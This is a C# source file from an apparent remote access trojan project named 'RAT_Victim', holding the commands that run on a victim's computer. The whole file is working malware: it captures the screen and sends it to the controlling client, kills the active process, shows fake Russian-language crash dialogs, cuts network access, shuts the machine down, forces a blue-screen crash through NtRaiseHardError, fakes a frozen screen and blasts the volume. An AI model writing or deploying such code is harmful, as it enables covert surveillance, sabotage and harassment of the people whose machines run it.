using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Timer = System.Windows.Forms.Timer;

namespace RAT_Victim
{
    internal static class Commands
    {
        private static readonly ImageConverter Converter = new ImageConverter();
        private static readonly SoundPlayer Player = new SoundPlayer();

        internal static void CloseActiveWindow()
        {
            var window = WinApi.GetForegroundWindow();
            WinApi.GetWindowThreadProcessId(window, out var processId);
            var process = WinApi.OpenProcess(1, true, processId);
            WinApi.TerminateProcess(process, 0);
        }

        internal static void ShowMessageBox()
        {
            var window = WinApi.GetForegroundWindow();
            WinApi.MessageBox(window,
                "Ошибка при запуске приложения (0xc0000005). Для выхода из приложения нажмите кнопку \"OK\".",
                GetActiveWindowTitle() + " - Ошибка приложения", 0x10);
        }

        internal static void TakeScreenshot()
        {
            var screenSize = Screen.PrimaryScreen.Bounds.Size;
            var bitmap = new Bitmap(screenSize.Width, screenSize.Height);
            var graphics = Graphics.FromImage(bitmap);
            graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
            var data = (byte[])Converter.ConvertTo(bitmap, typeof(byte[]));
            if (data != null) Program.Client.Send(data);
        }

        internal static void Shutdown()
        {
            var process = new Process
            {
                StartInfo = new ProcessStartInfo("cmd", "/C shutdown /s /t 0")
                { WindowStyle = ProcessWindowStyle.Hidden }
            };
            process.Start();
        }

        private static string GetActiveWindowTitle()
        {
            var window = WinApi.GetForegroundWindow();
            var builder = new StringBuilder();
            WinApi.GetWindowText(window, builder, builder.MaxCapacity);
            return builder.ToString();
        }

        public static void SendMessage(string message)
        {
            WinApi.MessageBox(WinApi.GetForegroundWindow(), message, GetActiveWindowTitle(), 0x40);
        }

        public static void PlaySound(Stream audioStream)
        {
            Player.Stream = audioStream;
            Player.Play();
        }

        public static void DisableWiFi()
        {
            var process = new Process();
            var info = process.StartInfo;
            info.FileName = "ipconfig";
            info.Arguments = "/release";
            info.WindowStyle = ProcessWindowStyle.Hidden;
            process.Start();
        }

        public static void Lag()
        {
            var canClose = false;
            var screenSize = Screen.PrimaryScreen.Bounds.Size;
            var bitmap = new Bitmap(screenSize.Width, screenSize.Height);
            var graphics = Graphics.FromImage(bitmap);
            graphics.CopyFromScreen(0, 0, 0, 0, screenSize);
            WinApi.GetCursorPos(out var point);
            var cursorSize = Cursor.Current.Size;
            Cursors.Arrow.Draw(graphics, new Rectangle(point.X, point.Y, cursorSize.Width, cursorSize.Height));

            var form = new Form
            {
                FormBorderStyle = FormBorderStyle.None,
                WindowState = FormWindowState.Maximized,
                ShowIcon = false,
                TopMost = true,
            };

            form.Load += (sender, args) =>
            {
                Cursor.Hide();
                var timer = new Timer { Interval = 5000 };
                timer.Tick += (o, eventArgs) =>
                {
                    canClose = true;
                    form.Close();
                };
                timer.Start();
            };

            form.FormClosing += (sender, args) => args.Cancel = !canClose;

            var pictureBox = new PictureBox
            {
                Image = bitmap,
                Dock = DockStyle.Fill
            };

            form.Controls.Add(pictureBox);
            Application.Run(form);
        }

        public static void Bsod()
        {
            WinApi.RtlAdjustPrivilege(19, true, false, out _);
            WinApi.NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out _);
        }

        public static void MaxVolume()
        {
            for (var i = 0; i < 50; i++)
            {
                WinApi.keybd_event(ConsoleKey.VolumeUp, 0, 0, 0);
                Thread.Sleep(1);
            }
        }

        public static void Blink()
        {
            var form = new Form
            {
                FormBorderStyle = FormBorderStyle.None,
                WindowState = FormWindowState.Maximized,
                BackColor = Color.Black,
                TopMost = true,
                ShowInTaskbar = false
            };
            form.Load += (sender, eventArgs) =>
            {
                const int interval = 25;
                Cursor.Hide();

                new Thread(() =>
                {
                    for (var i = 0; i < 5; i++)
                    {
                        form.Invoke((Action)(() => form.Opacity = 0.01));
                        Thread.Sleep(interval);

                        form.Invoke((Action)(() => form.Opacity = 1));
                        Thread.Sleep(interval);
                    }

                    form.Invoke((Action)form.Close);
                }).Start();
            };
            Application.Run(form);
        }
    }
}
